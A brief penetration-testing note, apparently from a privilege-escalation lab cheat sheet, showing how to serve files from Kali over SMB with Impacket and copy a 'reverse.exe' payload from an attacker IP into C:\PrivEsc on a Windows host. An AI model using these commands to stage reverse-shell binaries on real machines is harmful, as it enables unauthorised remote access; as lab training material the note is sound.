
### From Linux to windows - 

Start a simple smb server using  - 
`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`

Now on windows - 
`copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`
